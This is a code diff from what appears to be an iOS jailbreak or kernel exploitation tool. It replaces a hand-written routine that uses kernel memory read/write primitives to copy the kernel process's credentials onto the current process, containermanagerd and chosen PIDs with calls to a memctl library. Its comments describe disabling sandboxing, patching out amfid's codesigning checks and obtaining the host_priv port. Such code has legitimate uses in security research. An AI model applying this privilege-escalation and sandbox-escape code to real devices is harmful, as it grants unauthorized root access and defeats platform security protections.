@@ -7,6 +7,7 @@
 #include <mach/mach.h>
 
 #include "memctl/core.h"
+#include "memctl/privilege_escalation.h"
 #include "memctl/process.h"
 
 #include "kernel_memory_helpers.h"
@@ -142,30 +143,6 @@ uint64_t find_proc(char* target_p_comm) {
   return 0;
 }
 
-void copy_creds_from_to(uint64_t proc_from, uint64_t proc_to) {
-  uint64_t creds_from = rk64(proc_from + struct_proc_p_ucred_offset);
-  printf("kernel creds: 0x%llx\n", creds_from);
-  
-  // leak the creds
-  wk32(creds_from + struct_kauth_cred_cr_ref_offset, 0x444444);
-  
-  // replace our proc's cred point with it
-  wk64(proc_to + struct_proc_p_ucred_offset, creds_from);
-  
-  // and to all our threads' cached cred pointers
-  uint64_t uthread = rk64(proc_to + struct_proc_p_uthlist_offset);
-  
-  while (uthread != 0) {
-    // update the uthread's cred
-    wk64(uthread + struct_uthread_uu_ucred_offset, creds_from);
-    printf("updated this thread's uu_ucreds\n");
-    
-    // get the next thread
-    uthread = rk64(uthread + struct_uthread_uu_list_offset);
-    printf("next uthread: 0x%llx\n", uthread);
-  }
-}
-
 void disable_protections(uint64_t kernel_base, uint64_t realhost) {
   allproc = kernel_base + allproc_offset;
 
@@ -177,15 +154,17 @@ void disable_protections(uint64_t kernel_base, uint64_t realhost) {
   // and give ourselves launchd's creds
   // then patch out the codesigning checks in amfid.
 
-  copy_creds_from_to(kernproc, currentproc);
-  
+  bool success = proc_copy_credentials(currentproc, kernproc);
+  assert(success);
+
   // unsandbox containermanagerd so it can make the containers for uid 0 processes
   // I do also have a patch for containermanagerd to fixup the persona_id in the sb_packbuffs
   // but this is much simpler (and also makes it easier to clear up the mess of containers!)
   // I ran out of time to properly undestand containers enough to write a better hook
   // for containermanagerd so this will have to do
-  copy_creds_from_to(kernproc, containermanager_proc);
-  
+  success = proc_copy_credentials(containermanager_proc, kernproc);
+  assert(success);
+
   // make the host port also point to the host_priv port:
   // the host port we gave our task will be reset by the sandbox hook
   uint64_t host_priv = rk64(realhost+0x20); // host special port 2
@@ -199,15 +178,13 @@ void disable_protections(uint64_t kernel_base, uint64_t realhost) {
 }
 
 void unsandbox_pid(pid_t target_pid) {
-  uint64_t proc = rk64(allproc);
-  
-  for (int i = 0; i < 1000 && proc; i++) {
-    uint32_t pid = rk32(proc + struct_proc_p_pid_offset);
-    if (pid == target_pid) {
-      copy_creds_from_to(kernproc, proc);
-      return;
-    }
-    
-    proc = rk64(proc);
+  kaddr_t proc;
+  bool success = proc_find(&proc, target_pid, false);
+  assert(success);
+  if (proc != 0) {
+    success = proc_copy_credentials(proc, kernproc);
+    assert(success);
+    success = proc_rele(proc);
+    assert(success);
   }
 }
